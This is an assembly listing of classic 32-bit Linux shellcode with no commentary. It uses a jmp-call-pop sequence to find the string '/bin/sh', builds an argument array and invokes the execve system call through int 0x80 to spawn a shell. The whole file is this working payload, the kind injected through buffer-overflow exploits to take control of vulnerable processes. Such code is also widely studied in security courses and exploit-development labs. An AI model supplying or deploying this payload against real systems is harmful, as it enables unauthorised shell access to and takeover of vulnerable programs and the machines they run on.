 BITS 32 
 jmp short callit 
 doit: 
 pop ebx 
 xor eax,eax 
 cdq 
 mov [ebx+7],al 
 mov [ebx+8],ebx 
 mov [ebx+12],eax 
 lea ecx,[ebx+8] 
 mov al,0x0b 
 int 0x80 
 callit: 
 call doit 
 db '/bin/sh'
